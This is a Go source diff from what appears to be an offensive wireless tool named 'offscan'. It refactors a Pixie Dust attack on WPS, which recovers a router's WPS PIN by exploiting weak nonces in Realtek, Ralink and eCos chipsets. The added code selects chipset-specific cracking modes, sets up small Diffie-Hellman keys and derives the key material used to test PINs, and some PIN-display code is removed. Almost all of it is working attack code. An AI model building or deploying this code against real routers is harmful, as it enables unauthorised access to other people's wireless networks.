@@ -27,7 +27,6 @@ import (
 	"math/big"
 	"net"
 	"offscan/internal/utils"
-	"os"
 	"slices"
 	"time"
 )
@@ -53,8 +52,8 @@ type pixieDustAttack struct {
 	m7enc       []byte
 	force       bool
 	dhSmall     bool
-	start       string
-	end         string
+	start       int64
+	end         int64
 	cStart      int
 	cEnd        int
     emsk        []byte
@@ -85,6 +84,11 @@ func (pda *pixieDustAttack) execute() {
     pda.validDHSmallFlag()
     pda.checkSmallDHKeys()
     pda.validRequiredFlags()
+    pda.validDates()
+    pda.setModes()
+    pda.displayModes()
+    pda.setTimeRange()
+    pda.setDHSmall()
     pda.displayTime()
 }
 
@@ -108,11 +112,45 @@ func (pda *pixieDustAttack) checkSmallDHKeys() {
 
 
 
+func (pda *pixieDustAttack) setModes() {
+    if len(pda.modes) > 0 { return }
+
+    if pda.isRTL819xPKE() {
+        pda.modes = append(pda.modes, rtl819x)
+        return
+    }
+
+    pda.modes = append(pda.modes, rt)
+
+    if pda.isGlibc() {
+        pda.modes = append(pda.modes, rtl819x)
+    }
+
+    pda.modes = append(pda.modes, eCosSimple)
+}
+
+
+
+func (pda *pixieDustAttack) setDHSmall() {
+    if pda.dhSmall && pda.pkr == nil {
+        pda.pkr = make([]byte, wpsPkeyLen)
+        pda.pkr[wpsPkeyLen-1] = 0x02
+    }
+}
+
+
+
 func (pda *pixieDustAttack) getKDK() {
     dhKey  := computeDHKey(pda.pkr)
 	h      := hmac.New(sha256.New, dhKey)
 	h.Write(append(append(pda.eNonce, pda.ebssid...), pda.rNonce...))
 	pda.kdk = h.Sum(nil)
+}
+
+
+
+func (pda *pixieDustAttack) isModeSelect(mode uint8) bool {
+	return slices.Contains(pda.modes, mode)
 }
 
 
@@ -127,12 +165,6 @@ func computeDHKey(pkr []byte) []byte {
 
     dhkey := sha256.Sum256(sharedSecret)
     return dhkey[:]
-}
-
-
-
-func (pda *pixieDustAttack) isModeSelect(mode uint8) bool {
-	return slices.Contains(pda.modes, mode)
 }
 
 
@@ -184,35 +216,4 @@ func (pda *pixieDustAttack) keyDerivationFunction() {
 func (pda *pixieDustAttack) emptyPinHMAC() {
     h := hmac.New(sha256.New, pda.authKey)
     pda.emptyPsk = h.Sum(nil)
-}
-
-
-
-func (pda *pixieDustAttack) displayTime() {
-	elapsed := time.Since(pda.timeExec).Seconds()
-    fmt.Printf("[%%] %.2f seconds in execution\n", elapsed)
-}
-
-
-
-func (pda *pixieDustAttack) displayPIN() {
-    if pda.firstHalf == -1 && pda.secondHalf == -1 {
-        fmt.Println("[!] PIN not found")
-        return
-    }
-
-    if pda.emptyPin {
-        fmt.Println("[*] Empty PIN")
-        return
-    }
-
-    pin := utils.Pick(pda.firstHalf > -1,  fmt.Sprintf("%d", pda.firstHalf),  "????")
-    pin += utils.Pick(pda.secondHalf > -1, fmt.Sprintf("%d", pda.secondHalf), "????")
-
-    if pda.firstHalf != -1 && pda.secondHalf == -1 {
-        fmt.Println("[!] Only the first half was found")
-    }
-
-    fmt.Printf("[*] PIN: %s", pin)
-    os.Exit(0)
 }
